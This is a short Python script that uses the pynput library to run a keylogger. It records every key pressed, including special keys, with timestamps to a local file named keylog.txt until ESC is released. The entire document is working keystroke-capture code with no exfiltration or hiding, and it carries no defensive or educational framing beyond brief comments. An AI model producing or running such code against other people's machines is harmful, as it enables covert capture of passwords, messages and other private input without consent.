from pynput import keyboard
import logging

# Configure logging to save keystrokes to a file
logging.basicConfig(
    filename="keylog.txt",  # The log file will be created in the same directory as the script
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

def on_press(key):
    """Log key presses."""
    try:
        logging.info(f"Key pressed: {key.char}")  # Log printable characters
    except AttributeError:
        logging.info(f"Special key pressed: {key}")  # Log special keys like shift, ctrl, etc.

def on_release(key):
    """Stop the listener when ESC key is released."""
    if key == keyboard.Key.esc:
        return False  # Stop the listener

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
